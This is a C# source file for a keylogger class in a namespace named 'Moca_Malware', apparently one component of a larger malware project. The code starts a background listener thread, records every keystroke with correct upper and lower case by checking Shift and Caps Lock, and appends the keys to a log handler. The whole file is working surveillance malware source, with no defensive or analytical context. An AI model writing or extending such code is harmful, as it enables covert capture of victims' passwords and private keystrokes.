using System;
using System.Threading;
using System.Windows.Forms;

namespace Moca_Malware
{
    class Keylogger
    {
        private KeyboardListener keyboardListener;
        private Thread keyboardListenerThread;
        
        public Keylogger()
        {
            keyboardListener = new KeyboardListener();
            keyboardListenerThread = new Thread(keyboardListener.listenForAnyPress);
        }

        private string formatKey(Keys key)
        {
            string keyAsString = key.ToString();
            if (keyAsString.Length > 1)
                keyAsString = "<<" + keyAsString + ">>";
            else
                if (uppercase())
                    keyAsString = keyAsString.ToUpper();
                else
                    keyAsString = keyAsString.ToLower();
            return keyAsString;
        }

        public void startListening()
        {
            keyboardListener.isListening = true;
            keyboardListenerThread.Start();
            keyboardListener.OnKeyPressed += key => {
                KeyboardLogHandler.appendText(formatKey(key));
            };
        }

        private bool capsLock
        {
            get { return Control.IsKeyLocked(Keys.CapsLock); }
        }

        private bool shitKey
        {
            get { return Convert.ToBoolean(KeyboardListener.GetAsyncKeyState(Keys.ShiftKey) & 0x8000); }
        }

        private bool uppercase()
        {
            if (shitKey && capsLock)
                return false;

            if (!shitKey && !capsLock)
                return false;

            if (!shitKey && capsLock)
                return true;

            if (shitKey && !capsLock)
                return true;

            return false;
        }
    }
}
